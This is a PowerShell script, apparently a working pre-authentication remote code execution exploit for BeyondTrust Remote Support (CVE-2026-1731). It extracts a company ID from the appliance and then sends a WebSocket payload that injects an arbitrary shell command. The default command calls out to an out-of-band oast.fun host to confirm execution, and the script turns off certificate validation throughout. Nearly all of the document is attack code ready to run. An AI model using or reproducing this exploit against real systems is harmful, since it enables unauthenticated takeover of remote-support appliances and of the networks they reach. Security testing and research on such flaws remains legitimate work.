<#
.SYNOPSIS
    BeyondTrust Remote Support Pre-auth RCE (CVE-2026-1731) 
    Fixed version with TLS 1.2+ Enforcement and SNI Support.
#>

# --- Global Environment Fixes ---
# Force modern TLS versions
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
# Globally ignore SSL certificate validation errors
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

Function Invoke-BTExploit {
    Param(
        [Parameter(Mandatory=$true)]
        [string]$Target,
        [string]$Command = "nslookup XXXXXXXXXXXXXXXXXXX.oast.fun"
    )

    # Ensure Target doesn't contain protocol for the logic below
    $CleanTarget = $Target -replace "https://","" -replace "http://","" -replace "/$",""

    Write-Host "`n[*] Targeting: $CleanTarget" -ForegroundColor Cyan

    # 1. Fetch Portal Info (Using HttpClient for better header control)
    $PortalUrl = "https://$CleanTarget/get_portal_info"
    $Handler = New-Object System.Net.Http.HttpClientHandler
    $Handler.ServerCertificateCustomValidationCallback = { $true }
    $Client = New-Object System.Net.Http.HttpClient($Handler)
    
    try {
        # Explicitly set Host header to aid SNI/WAF traversal
        $Client.DefaultRequestHeaders.Add("Host", $CleanTarget)
        $RespTask = $Client.GetStringAsync($PortalUrl)
        $RespTask.Wait()
        $Info = $RespTask.Result

        if ($Info -match "company=([^;]+)") {
            $Company = $Matches[1].Trim()
            Write-Host "[+] Extracted Company: $Company" -ForegroundColor Green
        } else {
            Write-Host "[-] Could not find Company ID. Response received but no match." -ForegroundColor Red
            return
        }
    } catch {
        Write-Host "[-] HTTP Connection Failed: $($_.Exception.InnerException.Message)" -ForegroundColor Red
        return
    }

    # 2. WebSocket Orchestration
    
    $WS = New-Object System.Net.WebSockets.ClientWebSocket
    $WS.Options.AddSubProtocol("ingredi support desk customer thin")
    $WS.Options.SetRequestHeader("X-Ns-Company", $Company)
    # Ensure SNI/Host header is set for WebSocket Handshake
    $WS.Options.SetRequestHeader("Host", $CleanTarget)
    
    $Uri = New-Object System.Uri("wss://$CleanTarget/nw")
    $CTS = New-Object System.Threading.CancellationTokenSource(10000)

    try {
        Write-Host "[*] Attempting WebSocket Handshake..." -ForegroundColor Gray
        $ConnectTask = $WS.ConnectAsync($Uri, $CTS.Token)
        $ConnectTask.Wait()

        if ($WS.State -eq 'Open') {
            Write-Host "[+] WebSocket Connected." -ForegroundColor Green

            # 3. Payload Construction (Binary LF-Delimited)
            $LF = [byte]0x0A
            $Enc = [System.Text.Encoding]::ASCII
            
            # Format: hax[$(CMD)]\nUUID\n0\naaaa\n
            $Payload = $Enc.GetBytes("hax[`$($Command)]") + $LF + 
                       $Enc.GetBytes("aaaaaaaa-aaaa-aaaa-aaaaaaaaaaaa") + $LF + 
                       $Enc.GetBytes("0") + $LF + 
                       $Enc.GetBytes("aaaa") + $LF

            $Segment = New-Object System.ArraySegment[byte] -ArgumentList @(,$Payload)

            # 4. Transmission
            
            $SendTask = $WS.SendAsync($Segment, [System.Net.WebSockets.WebSocketMessageType]::Binary, $true, $CTS.Token)
            $SendTask.Wait()
            Write-Host "[+] Payload Transmitted successfully." -ForegroundColor Green

            # 5. Capture Response
            $Buffer = New-Object byte[] 4096
            $RcvSegment = New-Object System.ArraySegment[byte] -ArgumentList @(,$Buffer)
            $RcvTask = $WS.ReceiveAsync($RcvSegment, $CTS.Token)
            
            if ($RcvTask.Wait(3000)) {
                $Result = $Enc.GetString($Buffer, 0, $RcvTask.Result.Count)
                if ($Result.Trim()) {
                    Write-Host "[!] Appliance Output:`n$Result" -ForegroundColor Yellow
                }
            }
        }
    } catch {
        Write-Host "[-] WebSocket Error: $($_.Exception.InnerException.Message)" -ForegroundColor Red
    } finally {
        if ($WS.State -eq 'Open') { $WS.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Done", $CTS.Token).Wait() }
        $WS.Dispose()
        $Client.Dispose()
    }
}

# --- Usage Example ---
# Invoke-BTExploit -Target "bt.example.com" -Command "id"
